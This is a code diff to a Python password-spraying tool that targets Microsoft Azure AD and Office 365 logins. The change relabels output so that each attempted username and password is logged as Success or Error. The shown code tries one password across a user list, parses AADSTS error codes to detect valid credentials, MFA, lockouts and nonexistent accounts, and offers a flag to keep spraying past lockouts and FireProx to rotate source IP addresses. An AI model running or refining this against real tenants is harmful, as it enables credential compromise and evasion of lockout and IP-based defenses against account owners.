@@ -23,7 +23,7 @@ parser = argparse.ArgumentParser(description=description, epilog=epilog, formatt
 
 parser.add_argument("-u", "--userlist", metavar="FILE", required=True, help="File filled with usernames one-per-line in the format 'user@domain.com'. (Required)")
 parser.add_argument("-p", "--password", required=True, help="A single password that will be used to perform the password spray. (Required)")
-parser.add_argument("-o", "--out", metavar="OUTFILE", help="A file to output valid results to.")
+parser.add_argument("-o", "--out", metavar="OUTFILE", help="A file to output results to.")
 parser.add_argument("-f", "--force", action='store_true', help="Forces the spray to continue and not stop when multiple account lockouts are detected.")
 parser.add_argument("--url", default="https://login.microsoft.com", help="The URL to spray against (default is https://login.microsoft.com). Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.")
 parser.add_argument("-v", "--verbose", action="store_true", help="Prints usernames that could exist in case of invalid password")
@@ -114,43 +114,49 @@ for username in usernames:
             if verbose:
                 print(f"VERBOSE: Invalid username or password. Username: {username} could exist.")
                 unknownUsers.append(username)
+                results += f"Error : {username} : {password}\n"
             continue
 
         elif "AADSTS50128" in error or "AADSTS50059" in error:
             print(f"WARNING! Tenant for account {username} doesn't exist. Check the domain to make sure they are using Azure/O365 services.")
+            results += f"Error : {username} : {password}\n"
 
         elif "AADSTS50034" in error:
             print(f"WARNING! The user {username} doesn't exist.")
             unknownUsers.append(username)            
+            results += f"Error : {username} : {password}\n"
 
         elif "AADSTS50079" in error or "AADSTS50076" in error:
             # Microsoft MFA response
             print(f"SUCCESS! {username} : {password} - NOTE: The response indicates MFA (Microsoft) is in use.")
-            results += f"{username} : {password}\n"
+            results += f"Success : {username} : {password}\n"
 
         elif "AADSTS50158" in error:
             # Conditional Access response (Based off of limited testing this seems to be the response to DUO MFA)
             print(f"SUCCESS! {username} : {password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use.")
-            results += f"{username} : {password}\n"
+            results += f"Success : {username} : {password}\n"
 
         elif "AADSTS50053" in error:
             # Locked out account or Smart Lockout in place
             print(f"WARNING! The account {username} appears to be locked.")
             lockout_counter += 1
+            results += f"Error : {username} : {password}\n"
 
         elif "AADSTS50057" in error:
             # Disabled account
             print(f"WARNING! The account {username} appears to be disabled.")
+            results += f"Error : {username} : {password}\n"
 
         elif "AADSTS50055" in error:
             # User password is expired
             print(f"SUCCESS! {username} : {password} - NOTE: The user's password is expired.")
-            results += f"{username} : {password}\n"
+            results += f"Success : {username} : {password}\n"
 
         else:
             # Unknown errors
             print(f"Got an error we haven't seen yet for user {username}")
             print(error)
+            results += f"Error : {username} : {password}\n"
 
 
     # If the force flag isn't set and lockout count is 10 we'll ask if the user is sure they want to keep spraying
